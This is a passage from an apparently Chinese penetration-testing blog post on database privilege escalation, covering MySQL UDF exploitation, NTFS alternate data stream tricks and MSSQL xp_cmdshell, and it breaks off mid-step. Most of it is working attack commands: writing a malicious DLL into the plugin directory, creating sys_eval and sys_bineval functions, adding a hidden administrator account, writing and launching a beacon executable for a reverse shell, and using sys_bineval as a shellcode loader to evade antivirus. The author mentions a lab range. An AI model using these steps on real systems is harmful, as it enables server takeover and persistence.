版本后：MySQL安装目录\lib\plugin\目录下</p></blockquote><blockquote><p>32位的DLL存放在C:WindowsSysWOW64，而64位的DLL存放在C:WindowsSystem32</p></blockquote></li></ol><h2 id="udf-dll"><a href="#udf-dll" class="headerlink" title="udf.dll"></a>udf.dll</h2><h3 id="lib-mysqludf-sys-32-dll"><a href="#lib-mysqludf-sys-32-dll" class="headerlink" title="lib_mysqludf_sys_32.dll"></a>lib_mysqludf_sys_32.dll</h3><blockquote><p>我们这里会用到 lib_mysqludf_sys_32.dll ，在 Metasploit  framework 里面已经有了，你可以  在 &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F; 这个目录下选择对应操作系统和 架构的 UDF 文件。  </p></blockquote><h4 id="sys-exec"><a href="#sys-exec" class="headerlink" title="sys_exec"></a>sys_exec</h4><blockquote><p>该函数将在‘系统’ 函数内传递参数args-&gt;args[0]  可以使用它在目标机器上执行系统命令</p></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 创建<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_exec <span class="hljs-keyword">returns</span> <span class="hljs-type">int</span> soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br><br># 验证<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;sys_exec&#x27;</span>;<br><br># 删除<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_exec;<br></code></pre></td></tr></table></figure><h4 id="sys-eval"><a href="#sys-eval" class="headerlink" title="sys_eval"></a>sys_eval</h4><blockquote><p>该函数执行系统命令并且在屏幕上通过标准输出显示</p></blockquote><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># 创建</span><br>create function sys_eval returns <span class="hljs-built_in">string</span> soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br><br><span class="hljs-meta"># 验证</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> name = <span class="hljs-string">&#x27;sys_eval&#x27;</span>;<br><br><span class="hljs-meta"># 使用</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_eval</span>(<span class="hljs-params"><span class="hljs-string">&#x27;dir&#x27;</span></span>)</span>;<br><br><span class="hljs-meta"># 删除</span><br>drop function sys_eval;<br></code></pre></td></tr></table></figure><h4 id="sys-get"><a href="#sys-get" class="headerlink" title="sys_get"></a>sys_get</h4><blockquote><p>该函数使用getenv 函数放回系统变量的值</p></blockquote><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># 创建</span><br>create function sys_get returns <span class="hljs-built_in">string</span> soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br><br><span class="hljs-meta"># 验证</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> name = <span class="hljs-string">&#x27;sys_get&#x27;</span>;<br><br><span class="hljs-meta"># 使用</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_get</span>(<span class="hljs-params"><span class="hljs-string">&#x27;longonserver&#x27;</span></span>)</span>;<br><br><span class="hljs-meta"># 删除</span><br>drop function sys_get;<br></code></pre></td></tr></table></figure><h4 id="sys-bineval"><a href="#sys-bineval" class="headerlink" title="sys_bineval"></a>sys_bineval</h4><blockquote><p>该函数将使用VirtualAlloc API分配RWX内存，并使用strcpy将args-&gt; args [0]复制到新  分配的内存中。然后，这个缓冲区被传递给CreateThread API来产生一个新的线程。  </p></blockquote><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># 创建</span><br>create function sys_bineval returns <span class="hljs-built_in">int</span> soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br><br><span class="hljs-meta"># 验证</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> name = <span class="hljs-string">&#x27;sys_bineval&#x27;</span>;<br><br><span class="hljs-meta"># 删除</span><br>drop function sys_bineval;<br><br><span class="hljs-meta"># 使用</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_bineval</span>(<span class="hljs-params">load_file(<span class="hljs-string">&#x27;C:\\calc.b64&#x27;</span></span>))</span>;<br><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_bineval</span>(<span class="hljs-params">from_base64(load_file(<span class="hljs-string">&#x27;C:\\calc.b64&#x27;</span></span>)))</span>;<br></code></pre></td></tr></table></figure><p>这个可以用于Shellcode 加载器，从而实现免杀</p><h3 id="k8-udf-dll"><a href="#k8-udf-dll" class="headerlink" title="k8-udf.dll"></a>k8-udf.dll</h3><blockquote><p>  <a href="https://github.com/ym2011/POC-EXP/tree/master/K8/Mysql%E6%8F%90%E6%9D%83">https://github.com/ym2011/POC-EXP/tree/master/K8/Mysql%E6%8F%90%E6%9D%83</a>  </p></blockquote><p>查看dll 文件导出函数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215101243733.png" alt="image-20240215101243733"></p><ol><li><p>创建函数</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">create</span> <span class="hljs-function"><span class="hljs-keyword">function</span> 函数名<span class="hljs-params">(区分大小写)</span></span> returns <span class="hljs-built_in">string</span> soname <span class="hljs-string">&quot;dll名&quot;</span> (注意路径);<br></code></pre></td></tr></table></figure></li><li><p>删除函数</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">delete <span class="hljs-keyword">function</span> <span class="hljs-title">函数名;</span><br></code></pre></td></tr></table></figure></li><li><p>使用函数</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">select 函数名(参数列表)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p>获取参数信息</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">select 函数名(<span class="hljs-string">&quot;help&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p>dll 包含的函数</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cmdshell</span>        执行cmd;<br><span class="hljs-attribute">downloader</span>      下载者,到网上下载指定文件并保存到指定目录;<br><span class="hljs-attribute">open3389</span>        通用开<span class="hljs-number">3389</span>终端服务,可指定端口(不改端口无需重启);<br><span class="hljs-attribute">backshell</span>       反弹Shell;<br><span class="hljs-attribute">ProcessView</span>     枚举系统进程;<br><span class="hljs-attribute">KillProcess</span>     终止指定进程;<br><span class="hljs-attribute">regread</span>         读注册表;<br><span class="hljs-attribute">regwrite</span>        写注册表;<br><span class="hljs-attribute">shut</span>            关机,注销,重启;<br><span class="hljs-attribute">about</span>           关于;<br></code></pre></td></tr></table></figure></li></ol><h2 id="UDF-提权步骤"><a href="#UDF-提权步骤" class="headerlink" title="UDF 提权步骤"></a>UDF 提权步骤</h2><ol><li><p>查看操作系统的版本，确定使用什么文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>_compile_os, @<span class="hljs-variable">@version</span>_compile_machine;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%compile%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105536087.png" alt="image-20240215105536087"></p></li><li><p>查看mysql 的安装路径和版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%char%&#x27;</span>;<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@datadir</span>;<br><span class="hljs-keyword">select</span> version();<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105721000.png" alt="image-20240215105721000"></p></li><li><p>查看plugin目录路径</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@plugin</span>_dir;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105918482.png" alt="image-20240215105918482"></p><p>该目录就是放置dll 文件的地方‘</p></li><li><p>查看是否存在写权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215110338733.png" alt="image-20240215110338733"> </p><blockquote><p>secure-file-priv 参数是用来限制 LOAD  DATA, SELECT … INTO OUTFILE, and LOAD_FILE()传 到哪个指定目录的。  </p><p>当 secure-file-priv 的值为 NULL ，表示限制 mysqld 不允许导入、导出  </p><p>当 secure-file-priv 的值为 &#x2F;tmp&#x2F;，表示限制 mysqld 的导入、导出只能发生在&#x2F;tmp&#x2F;目录下  </p><p>当 secure-file-priv 的值没有具体值时，表示不对 mysqld 的导入、导出做限制</p></blockquote><p>如果发现这个并不为“” 空字符的话，那么这个也就没有办法利用了</p><p>如果是可以修改配置文件的情况下，可以尝试secure_file_priv 参数：  </p><blockquote><p>Windows: 修改 my.ini 在[mysqld]内加入secure_file_priv&#x3D;，重启mysql  </p><p>Linux：修改 my.cnf 在[mysqld]内加入secure_file_priv&#x3D;，重启mysql  </p></blockquote><p>我这里靶场的原因我就直接修改了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112131932.png" alt="image-20240215112131932"></p></li><li><p>mysql 写文件</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;111&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\1.txt&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;222&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:\\2.txt&#x27;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>outfile函数：可以导出多行数据  </p><p>dumpfile函数：只能导出一行数据  </p><p>outfile函数：在将数据写到文件里时有特殊的格式转换  </p><p>dumpfile函数：在将数据写到文件里时保持源数据格式</p></blockquote><p>当拥有可以写入的权限之后</p><p>就可以尝试写文件了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112346100.png" alt="image-20240215112346100"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112404664.png" alt="image-20240215112404664"></p><p>成功写入</p></li><li><p>创建plugin目录</p><blockquote><p>在MySQL5.1以后的环境下只有将udf.dll文件导出到MySQL安装目录\lib\plugin\目录下才  能成功，但是很多时候mysql安装目录下并不存在lib目录，mysql文件操作也并不能直接创建  目录，此时需要通过NTFS ADS流来创建目录。  </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112550900.png" alt="image-20240215112550900"></p><p>我这里就没有存在</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">select &#x27;xxx&#x27; into dumpfile &#x27;C:<span class="hljs-symbol">\\</span>phpstudy_pro<span class="hljs-symbol">\\</span>Extensions<span class="hljs-symbol">\\</span>MySQL5.7.26<span class="hljs-symbol">\\</span>lib<span class="hljs-symbol">\\</span>plugin::$INDEX_ALLOCATION&#x27;;<br><br></code></pre></td></tr></table></figure><p>这个就是创建一个文件夹</p><ol><li><p>ADS 流</p><blockquote><p>NTFS ADS ：全称为NTFS交换数据流（NTFS  Alternate Data Streams），是NTFS文件系统的一 个特性。NTFS文件系统中的每一个文件可以包括多个数据流，每个文件数据流的完整格式如下：</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">stream</span> <span class="hljs-attr">name</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">stream</span> <span class="hljs-attr">type</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">文件名</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">流名</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">流种类</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>只有一个data流时，stream name通常可以省略，stream type也可以成为attribute type。我  们通常看到的是文件的data流，其它数据流都处于隐藏状态。当attribute  type为$INDEX_ALLOCATION 时，表明该该数据流的宿主是文件夹。所以可以通过 mysql 导出数据到  directory_path::$INDEX_ALLOCATION文件的方法来创建directory_path目录。  </p></blockquote></li><li><p>$DATA流创建</p></li></ol><ul><li><p>创建宿主文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;this is a test file&quot;</span> &gt; test.txt<br></code></pre></td></tr></table></figure></li><li><p>关联数据流</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;this is a ads file&quot;</span> &gt; test.txt:aaa:<span class="hljs-variable">$data</span><br></code></pre></td></tr></table></figure></li><li><p>查看test.txt文件，读取正常</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">type</span> <span class="hljs-type">test.txt </span># 查看文件类型<br><span class="hljs-string">&quot;this is a test file&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215122209811.png" alt="image-20240215122209811"></p><p>当使用echo 输入的时候会发现并没有这个文件，但是我们使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /r<br></code></pre></td></tr></table></figure><p>的时候就会出现了</p><p>想要查看的话通过</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">notepad  filename</span><br></code></pre></td></tr></table></figure><p>就可以通过记事本打开了</p><p>流文件无法直接删除，只能删除源文件</p></li><li><p>创建隐藏文件</p></li></ul><pre><code class="hljs"> <figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">type</span> <span class="hljs-keyword">pass</span>.txt &gt; song.mp3:password:$<span class="hljs-keyword">DATA</span><br></code></pre></td></tr></table></figure></code></pre><ul><li>$INDEX_ALLOCATION流创建文件夹</li></ul><pre><code class="hljs"> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 123 &gt; hello::<span class="hljs-variable">$INDEX_ALLOCATION</span><br></code></pre></td></tr></table></figure> 注意前面跟文件夹的地址</code></pre></li><li><p>创建临时表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> udftemp(data <span class="hljs-type">BLOB</span>);<br></code></pre></td></tr></table></figure><p>BLOB 全称为 Binary Large Objects，即大型二进制对象  </p><p>或者使用</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">create <span class="hljs-keyword">table</span> udftemp(data <span class="hljs-comment">longblob)</span>;<br></code></pre></td></tr></table></figure><blockquote><p>为什么创建这个表？</p><p>因为我们需要这这个表中存储大量的二进制对象</p></blockquote></li><li><p>将dll 文件转换为十六进制</p><blockquote><p>  可以通过MySQL的hex函数将dll文件二进制数据转为十六进制数据，并保存到udf.txt文件中  </p></blockquote><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> <span class="hljs-built_in">hex</span>(load_file(<span class="hljs-string">&#x27;C:\\udf.dll&#x27;</span>)) into dumpfile <span class="hljs-string">&#x27;C:\\udf.txt&#x27;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这个步只需要将文件保存为16进制就行了，也可以尝试使用其他的方式，比如010 editor</p><p>注意注意，这一步可以使用自己mysql 实现，也就是说，我们不需要上传文件到这个目录</p></li><li><p>将dll文件内容插入表中</p><p>将udf.dll二进制数据插入临时表udftemp中，$binaryCode为udf.txt文件中复制的内容。  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">into</span> udf <span class="hljs-keyword">values</span>(<span class="hljs-keyword">CONVERT</span>(二进制文件,<span class="hljs-type">CHAR</span>));<br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/headImg.action" alt="image.png"></p></li><li><p>将dll导出到plugin目录</p></li></ol><pre><code class="hljs"><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">select data from udftemp into dumpfile <span class="hljs-string">&quot;C:<span class="hljs-subst">\\</span>phpStudy<span class="hljs-subst">\\</span>PHPTutorial<span class="hljs-subst">\\</span>MySQL<span class="hljs-subst">\\</span>lib<span class="hljs-subst">\\</span>plugin<span class="hljs-subst">\\</span>udf.dll&quot;</span>;<br></code></pre></td></tr></table></figure></code></pre><ol start="11"><li><p>创建函数</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval returns <span class="hljs-keyword">string</span> soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p>执行命令</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_eval</span>(<span class="hljs-params"><span class="hljs-string">&#x27;whoami&#x27;</span></span>)</span>;<br></code></pre></td></tr></table></figure></li><li><p>添加管理员用户</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">select sys<span class="hljs-constructor">_eval(&#x27;<span class="hljs-params">net</span> <span class="hljs-params">user</span> <span class="hljs-params">udftest</span> 123456 <span class="hljs-operator">/</span><span class="hljs-params">add</span> &amp; <span class="hljs-params">net</span> <span class="hljs-params">localgroup</span> <span class="hljs-params">administrators</span> <span class="hljs-params">udftest</span> <span class="hljs-operator">/</span><span class="hljs-params">add</span>&#x27;)</span>;<br>select sys<span class="hljs-constructor">_eval(&#x27;<span class="hljs-params">net</span> <span class="hljs-params">localgroup</span> <span class="hljs-params">administrators</span>&#x27;)</span><br><br></code></pre></td></tr></table></figure></li><li><p>命令执行反弹shell</p><p>也就是将dll 文件变成了我们的payload 然后通过这个 执行这个payload 实现反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 创建临时表<br>create table beacon(data longblob);<br><br># 转换beacon.exe二进制内容为十六进制<br>select hex(load_file(&#x27;C:\\beacon.exe&#x27;)) into dumpfile &#x27;C:\\beacon.txt&#x27;;<br><br># 将16进制beacon文件写入beacon表<br>insert into beacon(data) values (0x+beacon.txt中的值);<br><br># 写入beacon.exe<br>select data from beacon into dumpfile &quot;C:\\beacon.exe&quot;;<br><br># 利用创建的命令执行函数执行beacon.exe<br>select sys_eval(&#x27;start c:\\beacon.exe&#x27;)<br></code></pre></td></tr></table></figure></li></ol><h2 id="msf-自动提权"><a href="#msf-自动提权" class="headerlink" title="msf 自动提权"></a>msf 自动提权</h2><p>exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215134913223.png" alt="image-20240215134913223"></p><p>没有上线</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215144628397.png" alt="image-20240215144628397"></p><p>发现已经创建了这个dll</p><h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><h2 id="MSSQL角色用户权限"><a href="#MSSQL角色用户权限" class="headerlink" title="MSSQL角色用户权限"></a>MSSQL角色用户权限</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215145039673.png" alt="image-20240215145039673">通过查看用户身份判断是不是dbcreator ，如果是才能利用，如果不是的话，会有很多问题</p><h2 id="常用的指令"><a href="#常用的指令" class="headerlink" title="常用的指令"></a>常用的指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mssql"># 查看数据库版本<br>select @@version<br><br># 查看数据库系统参数<br>exec master..xp_msver;<br><br># 查看用户所属角色信息<br>sp_helpsrvrolemember<br><br># 查看当前数据库<br>select db_name();<br><br># 查看当前账户权限<br>select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)  #判断是否为sa权限<br>select IS_MEMBER(&#x27;db_owner&#x27;)         #判断是否为dba权限<br><br># 禁用advanced options<br>exec sp_configure &#x27;show advanced options&#x27;,0;GO RECONFIGURE;<br></code></pre></td></tr></table></figure><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>xp_cmdshell 扩展存储过程，可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符<br>串，并以文本行方式返回任何输出。<br>由于 xp_cmdshell 可以执行任何操作系统命令，所以一旦SQL Server管理员帐号（如sa）被攻破，那么攻击者就可以利用 xp_cmdshell 在 SQL Server 中执行操作系统命令。<br>注意：<br>SQL Server 2000 中默认是开启 xp_cmdshell 的<br>SQL Server 2005 及以上版本中 xp_cmdshell 默认是关闭的</p></blockquote><p>如果发现没有打开xp_cmpshell</p><p>如果当时已经获取administrator的权限的话，我们可以尝试打开</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec master..xp_cmdshell &quot;ver&quot;<br><br>exec master..xp_cmdshell &quot;dos命令&quot;;<br></code></pre></td></tr></table></figure><h3 id="提权利用"><a href="#提权利用" class="headerlink" title="提权利用"></a>提权利用</h3><ol><li><p>判断用户权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">select IS_SRVROLEMEMBER (&#x27;sysadmin&#x27;)<br></code></pre></td></tr></table></figure><blockquote><p>只有sysadmin 组的用户才能执行xp_cmdshell</p></blockquote><p>或者使用其他的方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">and (select IS_SRVROLEMEMBER (&#x27;sysadmin&#x27;))=1--<br></code></pre></td></tr></table></figure></li><li><p>判断是否存在 xp_cmdshell</p><p>  判断数据库中是否存在 xp_cmdshell 组件，返回结果为1表明组件存在  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">select count(*) from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name = &#x27;xp_cmdshell&#x27;<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">and 1=(select count(*) from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name = &#x27;xp_cmdshell&#x27;)<br></code></pre></td></tr></table></figure></li><li><p>检测 xp_cmdshell 是否启用 </p><blockquote><p>  尝试通过 xp_cmdshell 执行命令，检测 xp_cmdshell 是否启用  